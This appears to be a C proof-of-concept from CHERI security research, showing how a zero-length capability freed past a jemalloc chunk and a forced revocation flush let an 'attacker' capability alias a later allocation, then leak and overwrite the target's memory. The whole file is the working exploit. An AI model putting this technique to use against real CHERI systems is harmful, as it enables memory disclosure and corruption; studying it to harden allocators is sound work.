#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <cheriintrin.h>
#include "../../../utils/utils.h"

int main() {

    size_t size_to_be_shadowed = 0x1000; // Next allocation of that sized will be shadowed with a cap on the attacker side

    // Attacker side before target program get's executed
    void *cap = malloc(size_to_be_shadowed);
    void *trimmed_cap = cheri_bounds_set(cap+size_to_be_shadowed, 0);

    free(trimmed_cap);

    malloc_revoke_quarantine_force_flush(); // Force CHERIvoke cycle

    void *shadow_cap = malloc(size_to_be_shadowed); // Returns the chunk of trimmed_cap + size_to_be_shadowed, 
    // next chunk is going to return next calculated slot in jemalloc -> the chunk after cap = trimmed_cap + size_to_be_shadowed

    // Target program side 
    // ... code ....
    void *sensible_memory_chunk = malloc(size_to_be_shadowed); // Returns the chunk of trimmed_cap + size_to_be_shadowed
    *((char *)sensible_memory_chunk) = 'A'; // write something in sensible memory

    // Attacker side
    printf("Leaking sensible memory contents of: %c. Rewriting to 'X'...\n", *((char *)shadow_cap));
    *((char *)shadow_cap) = 'X';

    // Target program side
    printf("Sensible memory now contains %c\n", *((char *)sensible_memory_chunk));

    return 0;
}